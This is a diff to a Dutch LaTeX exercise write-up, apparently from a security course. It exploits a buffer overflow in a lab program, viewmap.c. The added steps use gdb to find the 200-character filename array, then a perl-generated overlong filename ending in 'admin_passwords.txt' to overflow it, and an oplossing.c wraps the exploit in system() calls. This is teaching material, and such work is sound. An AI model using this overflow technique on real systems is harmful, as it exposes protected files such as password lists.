@@ -1,8 +1,42 @@
 \begin{enumerate}
-  \item 
+  \item gcc-3.3 -g -o viewmap viewmap.c
+  \item gdb -q viewmap
+  \item (gdb) list
+  	\begin{enumerate}
+  		\item char filelist neemt enkel bestandsnamen van lengte 200 aan.
+  		\item Het aanmaken van een bestand \textgreater ~ 200 zal deze array overschrijven.
+  	\end{enumerate}
+  \item (gdb) quit
+  \item touch ``\$(perl -e `print ``Bestand.txt'' . `` ''x39 . ``admin\_passwords.txt'' ')''
+  	\begin{enumerate}
+  	\item Het bestand met een lengte \textgreater ~ 200 is aangemaakt.
+  	\end{enumerate}
+  \item ./viewmap
+  	\begin{enumerate}
+  	\item Succes!
+  	\end{enumerate}
+  \item Een mogelijke oplossing is de volgende:
 \end{enumerate}
 
 \begin{lstlisting}
+oplossing.c
+-----------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void){
+	system("touch \"$(perl -e 'print \"Bestand.txt\" . \" \"x39 . \"admin_passwords.txt\"')\"");
+
+	system("./viewmap");
+}
+\end{lstlisting}
+
+\begin{lstlisting}
+viewmap.c
+---------
+
 #include <dirent.h>
 #include <stdio.h>
 #include <string.h>
